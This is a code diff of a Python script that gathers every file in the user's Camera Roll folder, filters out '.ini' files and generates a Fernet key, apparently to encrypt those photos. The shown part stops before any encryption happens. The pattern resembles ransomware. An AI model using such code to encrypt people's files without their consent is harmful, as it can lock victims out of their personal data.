@@ -2,9 +2,11 @@ import os
 import scandir
 from cryptography.fernet import Fernet
 folder = os.path.expandvars("%userprofile%")+"/Pictures\Camera Roll" #can be changed to fit your needs
-i=0
-file_list = []
 
+file_list = []
+wrong_file = []
+i=0
+o=0
 
 for paths, dirs, files in scandir.walk(folder):
     for file in files:
@@ -18,8 +20,14 @@ for paths, dirs, files in scandir.walk(folder):
 while i <= len(file_list)-1:
     file_path = file_list[i]
     if file_path.endswith("ini"):
-        file_list.remove(file_list[i])
+        wrong_file.append(i)
+    
     i=i+1
+wrong_file.sort(reverse=True)
+while o <= len(wrong_file)-1:
+    file_path= int(wrong_file[o])
+    file_list.remove(file_list[file_path])
+    o= o+1
 #end win11 ghostfilefilter
 
 key = Fernet.generate_key()
